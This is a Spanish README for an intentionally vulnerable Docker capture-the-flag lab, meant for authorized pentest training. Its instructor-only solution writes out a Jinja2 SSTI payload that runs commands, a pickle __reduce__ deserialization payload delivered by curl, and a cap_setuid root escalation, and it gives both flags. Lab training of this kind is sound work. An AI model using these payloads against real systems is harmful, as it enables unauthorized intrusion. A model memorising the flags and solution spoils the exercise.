# Lab EXAMEN — ejercicio de pentest en un contenedor

> **Solo para uso de entrenamiento autorizado.** Vulnerable a propósito. Escucha
> solo en `127.0.0.1`. No lo expongas a ninguna red no confiable.

Un contenedor Docker con un pequeño panel de estado en Flask. Hay **dos vías de
entrada** a una shell como `app`, y una escalada compartida:
recon HTTP → (**SSTI** en Jinja2 **o** **deserialización insegura** con pickle) →
RCE como `app` → escalada por **cap_setuid** → `root` → flag en `/root/flag.txt`.

## Servicio
| Puerto | Servicio | Rol |
|--------|----------|-----|
| 5000 | Flask (Python) | entrada #1 SSTI (`/greet`) · entrada #2 pickle (`/api/prefs`); privesc por copia de python con capabilities |

## Ejecución
Preferí el launcher de la raíz (`../lab.sh` / `../lab.ps1`), que levanta este lab
junto con el demo. De forma independiente:
```bash
docker compose up -d --build
docker compose port lab 5000     # -> 127.0.0.1:<puerto aleatorio>
```
Reiniciar entre alumnos:
```bash
docker compose down && docker compose up -d --build
```

## Solución prevista (solo instructor)
1. **Recon** — abrí el sitio y leé el código fuente HTML. Un comentario `TODO`
   revela que el endpoint `/greet?name=` renderiza el nombre a través del motor de
   templates.
2. **SSTI → RCE** — confirmá con `?name={{7*7}}` (renderiza `Hello, 49!`). Después
   ejecutá comandos como el usuario `app`:
   ```
   /greet?name={{cycler.__init__.__globals__.os.popen('id').read()}}
   ```
   User flag: `/home/app/user.txt`. La nota de traspaso `/home/app/notes.txt`
   apunta al privesc.
3. **Privesc** — `getcap -r / 2>/dev/null` muestra que `/usr/local/bin/pythonpriv`
   tiene `cap_setuid+ep`. Cualquier usuario puede entonces setear UID 0:
   ```bash
   /usr/local/bin/pythonpriv -c 'import os;os.setuid(0);os.execl("/bin/bash","bash","-p")'
   cat /root/flag.txt
   ```

## Vía alternativa de entrada — deserialización insegura (pickle)
El código fuente de la landing también menciona el endpoint `/api/prefs`, que
restaura "preferencias" desde un valor `prefs` en base64 que pasa por
`pickle.loads`. Eso es **deserialización insegura** → RCE como `app` (misma shell
que el SSTI; desde ahí se usa el mismo privesc por `cap_setuid`).

1. **Descubrir el formato** — `GET /api/prefs` sin parámetros devuelve un ejemplo
   del valor pickled esperado.
2. **Construir el payload** — un objeto cuyo `__reduce__` ejecuta un comando:
   ```python
   import pickle, base64, subprocess
   class E:
       def __reduce__(self):
           return (subprocess.check_output, (["id"],))
   print(base64.b64encode(pickle.dumps(E())).decode())
   ```
3. **Disparar** — enviar el base64 en `?prefs=` (o en la cookie `prefs`):
   ```bash
   curl "http://172.31.0.10:5000/api/prefs?prefs=<base64>"
   # Preferences loaded: b'uid=1000(app) ...'
   ```
   Para un shell interactivo, usar un payload de reverse shell en `__reduce__`.
   Luego continuar con el privesc de `cap_setuid`.

## Flags
- user: `FLAG{ssti_rce_as_app_via_jinja2}`
- root: `FLAG{root_via_cap_setuid_python_gg}`
